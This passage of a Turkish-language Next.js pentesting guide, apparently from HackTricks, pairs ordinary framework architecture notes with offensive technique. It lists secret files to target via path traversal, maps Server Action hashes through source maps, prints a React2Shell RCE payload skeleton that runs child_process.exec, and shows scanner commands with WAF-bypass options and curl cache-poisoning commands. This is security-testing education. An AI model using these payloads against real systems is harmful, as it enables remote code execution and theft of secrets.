- **Hassas Yolların Açığa Çıkarılması:** Hassas dizinlere alias verilmesi ve istemci tarafı erişimine izin verilmesi gizli bilgilerin leak olmasına neden olabilir.
- **Sırların Paketlenmesi:** Hassas dosyalar istemci için paketlenirse, içerikleri source maps veya istemci tarafı kodunu inceleyerek erişilebilir hale gelir.

**Saldırganlar bunu nasıl kötüye kullanır:**

Saldırganlar uygulamanın dizin yapısına erişebilir veya yeniden oluşturabilir; bu da hassas dosyaları veya verileri bulup istismar etmelerine yol açabilir.

</details>

### `pages/_app.js` ve `pages/_document.js`

#### **`pages/_app.js`**

**Amaç:** Varsayılan App bileşenini geçersiz kılar; global durum, stil ve layout bileşenlerine izin verir.

**Kullanım Durumları:**

- Global CSS eklemek.
- Layout wrapper'ları eklemek.
- Durum yönetimi kütüphanelerini entegre etme.

**Örnek:**
```jsx
// pages/_app.js
import "../styles/globals.css"

function MyApp({ Component, pageProps }) {
return <Component {...pageProps} />
}

export default MyApp
```
#### **`pages/_document.js`**

**Amaç:** Varsayılan Document öğesini geçersiz kılar, HTML ve Body etiketlerinin özelleştirilmesine olanak tanır.

**Kullanım Durumları:**

- `<html>` veya `<body>` etiketlerini değiştirme.
- Meta etiketleri veya özel script'ler ekleme.
- Üçüncü taraf yazı tiplerini entegre etme.

**Örnek:**
```jsx
// pages/_document.js
import Document, { Html, Head, Main, NextScript } from "next/document"

class MyDocument extends Document {
render() {
return (
<Html lang="en">
<Head>{/* Custom fonts or meta tags */}</Head>
<body>
<Main />
<NextScript />
</body>
</Html>
)
}
}

export default MyDocument
```
### Custom Server (Optional)

**Purpose:** While Next.js comes with a built-in server, you can create a custom server for advanced use cases like custom routing or integrating with existing backend services.

**Note:** Using a custom server can limit deployment options, especially on platforms like Vercel that optimize for Next.js's built-in server.

**Example:**
```javascript
// server.js
const express = require("express")
const next = require("next")

const dev = process.env.NODE_ENV !== "production"
const app = next({ dev })
const handle = app.getRequestHandler()

app.prepare().then(() => {
const server = express()

// Custom route
server.get("/a", (req, res) => {
return app.render(req, res, "/a")
})

// Default handler
server.all("*", (req, res) => {
return handle(req, res)
})

server.listen(3000, (err) => {
if (err) throw err
console.log("> Ready on http://localhost:3000")
})
})
```
---

## Ek Mimari ve Güvenlik Hususları

### Ortam Değişkenleri ve Konfigürasyon

**Amaç:** Hassas bilgileri ve yapılandırma ayarlarını kod tabanının dışında yönetmek.

**En İyi Uygulamalar:**

- **Use `.env` Files:** `.env.local` gibi dosyalarda API anahtarları gibi değişkenleri saklayın (sürüm kontrolünden hariç tutulur).
- **Access Variables Securely:** Ortam değişkenlerine erişmek için `process.env.VARIABLE_NAME` kullanın.
- **Never Expose Secrets on the Client:** Hassas değişkenlerin yalnızca sunucu tarafında kullanıldığından emin olun.

**Örnek:**
```javascript
// next.config.js
module.exports = {
env: {
API_KEY: process.env.API_KEY, // Accessible on both client and server
SECRET_KEY: process.env.SECRET_KEY, // Be cautious if accessible on the client
},
}
```
**Not:** Değişkenleri yalnızca sunucu tarafıyla sınırlamak için, bunları `env` objesinden çıkarın veya istemciye açılmaları için `NEXT_PUBLIC_` ile prefixleyin.

### LFI/download endpoint'leri aracılığıyla hedeflenecek yararlı sunucu artefaktları

Next.js uygulamasında bir path traversal veya download API'si bulursanız, server-side sırlarını ve auth mantığını leak eden derlenmiş artefaktları hedefleyin:

- `.env` / `.env.local` — session secrets ve provider credentials için.
- `.next/routes-manifest.json` ve `.next/build-manifest.json` — tam bir route listesi için.
- `.next/server/pages/api/auth/[...nextauth].js` — derlenmiş NextAuth konfigürasyonunu kurtarmak için (genellikle `process.env` değerleri ayarlı olmadığında fallback passwords içerir).
- `next.config.js` / `next.config.mjs` — rewrites, redirects ve middleware routing'i incelemek için.

### Kimlik Doğrulama ve Yetkilendirme

**Yaklaşım:**

- **Oturum Tabanlı Kimlik Doğrulama:** Kullanıcı oturumlarını yönetmek için çerezleri kullanın.
- **Token Tabanlı Kimlik Doğrulama:** Durumsuz kimlik doğrulama için JWT'leri uygulayın.
- **Üçüncü Taraf Sağlayıcılar:** `next-auth` gibi kütüphaneler kullanarak OAuth sağlayıcılarıyla (ör. Google, GitHub) entegre olun.

**Güvenlik Uygulamaları:**

- **Güvenli Çerezler:** `HttpOnly`, `Secure` ve `SameSite` özniteliklerini ayarlayın.
- **Parola Hashleme:** Parolaları saklamadan önce her zaman hash'leyin.
- **Girdi Doğrulama:** Girdileri doğrulama ve sanitize ederek injection saldırılarını önleyin.

**Örnek:**
```javascript
// pages/api/login.js
import { sign } from "jsonwebtoken"
import { serialize } from "cookie"

export default async function handler(req, res) {
const { username, password } = req.body

// Validate user credentials
if (username === "admin" && password === "password") {
const token = sign({ username }, process.env.JWT_SECRET, {
expiresIn: "1h",
})
res.setHeader(
"Set-Cookie",
serialize("auth", token, {
path: "/",
httpOnly: true,
secure: true,
sameSite: "strict",
})
)
res.status(200).json({ message: "Logged in" })
} else {
res.status(401).json({ error: "Invalid credentials" })
}
}
```
### Performans Optimizasyonu

**Stratejiler:**

- **Görüntü Optimizasyonu:** Otomatik görüntü optimizasyonu için Next.js'in `next/image` bileşenini kullanın.
- **Kod Bölme:** Dinamik importları kullanarak kodu bölün ve ilk yükleme sürelerini azaltın.
- **Önbellekleme:** API yanıtları ve statik varlıklar için önbellekleme stratejileri uygulayın.
- **Tembel Yükleme:** Bileşenleri veya varlıkları yalnızca gerektiğinde yükleyin.

**Örnek:**
```jsx
// Dynamic Import with Code Splitting
import dynamic from "next/dynamic"

const HeavyComponent = dynamic(() => import("../components/HeavyComponent"), {
loading: () => <p>Loading...</p>,
})
```
## Next.js Server Actions Enumeration (hash to function name via source maps)

Modern Next.js uses “Server Actions” that execute on the server but are invoked from the client. In production these invocations are opaque: all POSTs land on a common endpoint and are distinguished by a build-specific hash sent in the `Next-Action` header. Example:
```http
POST /
Next-Action: a9f8e2b4c7d1...
```
`productionBrowserSourceMaps` etkinleştirildiğinde, minified JS chunks `createServerReference(...)` çağrıları içerir; bu çağrılar action hash ile orijinal fonksiyon adı arasındaki eşlemeyi kurtarmak için yeterli yapı (ve ilişkili source maps) leak eder. Bu, `Next-Action` içinde gözlemlenen hash'leri `deleteUserAccount()` veya `exportFinancialData()` gibi somut hedeflere çevirmenizi sağlar.

### Çıkarma yaklaşımı (regex on minified JS + optional source maps)

İndirilen JS chunks içinde `createServerReference` arayın ve hash ile function/source sembolünü çıkarın. İki kullanışlı desen:
```regex
# Strict pattern for standard minification
createServerReference\)"([a-f0-9]{40,})",\w+\.callServer,void 0,\w+\.findSourceMapURL,"([^"]+)"\)

# Flexible pattern handling various minification styles
createServerReference[^\"]*"([a-f0-9]{40,})"[^\"]*"([^"]+)"\s*\)
```
- Grup 1: server action hash (40+ hex chars)
- Grup 2: symbol or path that can be resolved to the original function via the source map when present

If the script advertises a source map (trailer comment `//# sourceMappingURL=<...>.map`), fetch it and resolve the symbol/path to the original function name.

### Pratik iş akışı

- Gözatırken pasif keşif: `Next-Action` başlıkları ve JS chunk URL'lerini içeren istekleri yakalayın.
- Referans verilen JS bundle'larını ve varsa beraberindeki `*.map` dosyalarını fetch edin.
- Yukarıdaki regex'i çalıştırarak hash↔name sözlüğü oluşturun.
- Sözlüğü test hedeflemek için kullanın:
  - İsim odaklı triage (ör. `transferFunds`, `exportFinancialData`).
  - Fonksiyon adına göre build'ler arası coverage'ı takip edin (hash'ler build'ler arasında değişir).

### Exercising hidden actions (template-based request)

Proxy içinde gözlemlenen geçerli bir POST'u şablon olarak alın ve başka bir keşfedilen action'ı hedeflemek için `Next-Action` değerini değiştirin:
```http
# Before
Next-Action: a9f8e2b4c7d1

# After
Next-Action: b7e3f9a2d8c5
```
Replay in Repeater kullanarak, authorization, input validation ve business logic'i aksi takdirde ulaşılamayan actions üzerinde test edin.

### Burp automation

- NextjsServerActionAnalyzer (Burp extension) yukarıdaki adımları Burp içinde otomatikleştirir:
- JS chunk'lar için proxy geçmişini tarar, `createServerReference(...)` girdilerini çıkarır ve mevcutsa source map'leri çözer.
- Aranabilir bir hash↔function-name sözlüğü tutar ve function name'e göre build'ler arasında de-duplicate eder.
- Geçerli bir template POST bulabilir ve hedef action’ın hash'i yerleştirilmiş, gönderilmeye hazır bir Repeater sekmesi açabilir.
- Repo: https://github.com/Adversis/NextjsServerActionAnalyzer

### Notes and limitations

- `productionBrowserSourceMaps`'un production'da etkinleştirilmesini gerektirir; böylece bundle/source map'lerden isimler geri kazanılabilir.
- Function-name disclosure tek başına bir vulnerability değildir; keşfi yönlendirmek ve her action’ın authorization'ını test etmek için kullanın.

### React Server Components Flight protocol deserialization RCE (CVE-2025-55182)

Next.js App Router dağıtımları, `react-server-dom-webpack` **19.0.0–19.2.0 (Next.js 15.x/16.x)** üzerinde Server Actions'ı açığa çıkarıyorsa, Flight chunk deserialization sırasında kritik bir server-side prototype pollution içerir. Bir Flight payload'u içine `$` referansları yerleştirerek bir attacker, polluted prototype'lardan keyfi JavaScript yürütmeye ve sonra Node.js sürecinde OS komut yürütmeye pivot yapabilir.

{{#ref}}
../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/README.md
{{#endref}}

#### Attack chain in Flight chunks

1. **Prototype pollution primitive:** `"then": "$1:__proto__:then"` olarak ayarlayın; böylece resolver `Object.prototype` üzerine bir `then` fonksiyonu yazar. Sonrasında işlenen herhangi bir düz nesne thenable olur ve attacker'ın RSC iç mantığındaki async kontrol akışını etkilemesine izin verir.
2. **Rebinding to the global `Function` constructor:** `_response._formData.get`'i `"$1:constructor:constructor"`'a yönlendirin. Çözümleme sırasında `object.constructor` → `Object`, ve `Object.constructor` → `Function` olur; böylece gelecekte `_formData.get()` çağrıları aslında `Function(...)`'ı çalıştırır.
3. **Code execution via `_prefix`:** JavaScript kaynağını `_response._prefix` içine koyun. Kirlenmiş `_formData.get` çağrıldığında framework `Function(_prefix)(...)`'u değerlendirir; böylece enjekte edilen JS `require('child_process').exec()` veya diğer herhangi bir Node primitive'ini çalıştırabilir.

#### Payload skeleton
```json
{
"then": "$1:__proto__:then",
"status": "resolved_model",
"reason": -1,
"value": "{\"then\":\"$B1337\"}",
"_response": {
"_prefix": "require('child_process').exec('id')",
"_chunks": "$Q2",
"_formData": { "get": "$1:constructor:constructor" }
}
}
```
#### React Server Function maruziyetinin haritalanması

React Server Functions (RSF), `'use server';` direktifini içeren herhangi bir fonksiyondur. Bu fonksiyonlardan birine bağlı her form action, mutation veya fetch helper, RSC Flight endpoint'ine dönüşür ve saldırgan tarafından sağlanan payload'ları memnuniyetle deserialize eder. React2Shell değerlendirmelerinden türetilmiş faydalı keşif adımları:

- **Statik envanter:** direktifi arayın; framework tarafından otomatik olarak kaç RSF'nin maruz bırakıldığını anlamak için.
```bash
rg -n "'use server';" -g"*.{js,ts,jsx,tsx}" app/
```
- **App Router varsayılanları:** `create-next-app` varsayılan olarak App Router + `app/` dizinini etkinleştirir; bu her rotayı sessizce RSC-uyumlu bir uç noktaya çevirir. `/_next/static/chunks/app/` gibi App Router varlıkları veya Flight parçalarını `text/x-component` üzerinden stream eden yanıtlar İnternete açık güçlü parmak izleridir.
- **Dolaylı olarak savunmasız RSC dağıtımları:** React'in kendi uyarısı, RSC runtime'ını dağıtan uygulamaların **açık RSFs olmadan bile** istismar edilebilir olabileceğini belirtiyor; bu yüzden `react-server-dom-*` 19.0.0–19.2.0 kullanan her yapıyı şüpheli sayın.
- **RSC içeren diğer framework'ler:** Vite RSC, Parcel RSC, React Router RSC preview, RedwoodSDK, Waku vb. aynı serializer'ı yeniden kullanır ve düzeltilmiş React build'lerini entegre edene kadar aynı uzak saldırı yüzeyini devralır.

#### Sürüm kapsama (React2Shell)

- `react-server-dom-webpack`, `react-server-dom-parcel`, `react-server-dom-turbopack`: **zafiyetli** sürümler 19.0.0, 19.1.0–19.1.1 ve 19.2.0; sırasıyla **düzeltilmiş** sürümler 19.0.1, 19.1.2 ve 19.2.1.
- **Next.js stable:** App Router sürümleri 15.0.0–16.0.6 zafiyetli RSC yığını barındırır. Patch trenleri 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7 sabitlenmiş bağımlılıkları içerir; bu versiyonların altındaki herhangi bir build yüksek değerli hedeftir.
- **Next.js canary:** `14.3.0-canary.77+` da hatalı runtime'ı içerir ve şu anda yama uygulanmış canary sürümleri yok; bu da bu parmak izlerini güçlü istismar adayları yapar.

#### Uzaktan tespit oracle'ı

Assetnote’in [`react2shell-scanner`](https://github.com/assetnote/react2shell-scanner) aday yollara özel hazırlanmış bir multipart Flight isteği gönderir ve sunucu tarafı davranışını izler:

- **Default mode** deterministik bir RCE payload'u yürütür (matematik işlemi `X-Action-Redirect` üzerinden yansıtılır) ve kod yürütmeyi kanıtlar.
- **`--safe-check` mode** kasıtlı olarak Flight mesajını bozar; böylece yamalanmış sunucular `200/400` dönerken, zafiyetli hedefler yanıt gövdesinde `E{"digest"` alt dizisini içeren `HTTP/500` yanıtları verir. Bu `(500 + digest)` çifti şu anda savunucular tarafından yayınlanmış en güvenilir uzaktan oracle'dır.
- Dahili `--waf-bypass`, `--vercel-waf-bypass` ve `--windows` anahtarları payload düzenini ayarlar, başına gereksiz veri ekler veya OS komutlarını değiştirir; böylece gerçek İnternet varlıklarını sorgulayabilirsiniz.
```bash
python3 scanner.py -u https://target.tld --path /app/api/submit --safe-check
python3 scanner.py -l hosts.txt -t 20 --waf-bypass -o vulnerable.json
```
### Diğer yakın zamanda ortaya çıkan App Router sorunları (2025 sonu)

1. **RSC DoS & source disclosure (CVE-2025-55184 / CVE-2025-67779 / CVE-2025-55183)** – bozuk Flight payload'ları RSC resolver'ı sonsuz döngüye sokabilir (pre-auth DoS) veya derlenmiş Server Function kodunun serileştirilmesini diğer işlemler için zorlayabilir. App Router build'leri ≥13.3 yamalana kadar etkilenir; 15.0.x–16.0.x ise upstream advisory'den gelen belirli patch satırlarına ihtiyaç duyar. Normal Server Action yolunu tekrar kullanın ama istismar amaçlı `$` referansları içeren bir `text/x-component` gövdesi stream edin. Bir CDN arkasında, takılı kalan bağlantı cache timeout'larıyla açık tutulur ve bu DoS'u ucuz hale getirir.  
- **Triage tip:** Yamalanmamış hedefler bozuk Flight payload'larından sonra `E{"digest"` içeren `500` döner; yamalanmış build'ler `400/200` döner. Zaten Flight chunks stream eden herhangi bir endpoint'i (bakın `Next-Action` header'larına veya `text/x-component` cevaplarına) test edin ve modifiye edilmiş payload ile replay yapın.

2. **RSC cache poisoning (CVE-2025-49005, App Router 15.3.0–15.3.2)** – eksik `Vary` başlığı, `Accept: text/x-component` yanıtının cache'lenmesine ve HTML bekleyen tarayıcılara sunulmasına izin veriyordu. Tek bir priming isteği sayfayı ham RSC payload'larıyla değiştirebilir. PoC flow:
```bash
# Prime CDN with an RSC response
curl -k -H "Accept: text/x-component" "https://target/app/dashboard" > /dev/null
# Immediately fetch without Accept (victim view)
curl -k "https://target/app/dashboard" | head
```
If the second response returns JSON Flight data instead of HTML, the route is poisonable. Purge cache after testing.

## References

- [Pentesting Next.js Server Actions — A Burp Extension for Hash-to-Function Mapping](https://www.adversis.io/blogs/pentesting-next-js-server-actions)
- [NextjsServerActionAnalyzer (Burp extension)](https://github.com/Adversis/NextjsServerActionAnalyzer)
- [CVE-2025-55182 React Server Components Remote Code Execution Exploit Tool](https://github.com/Spritualkb/CVE-2025-55182-exp)
- [CVE-2025-55182 & CVE-2025-66478 React2Shell – All You Need to Know](https://jfrog.com/blog/2025-55182-and-2025-66478-react2shell-all-you-need-to-know/)
- [0xdf – HTB Previous (Next.js middleware bypass, static export recon, NextAuth config leak)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [assetnote/react2shell-scanner](https://github.com/assetnote/react2shell-scanner)
- [Next.js Security Update: December 11, 2025 (CVE-2025-55183/55184/67779)](https://nextjs.org/blog/security-update-2025-12-11)
- [GHSA-r2fc-ccr8-96c4 / CVE-2025-49005: App Router cache poisoning](https://github.com/advisories/GHSA-r2fc-ccr8-96c4)

{{#include ../../banners/hacktricks-training.md}}
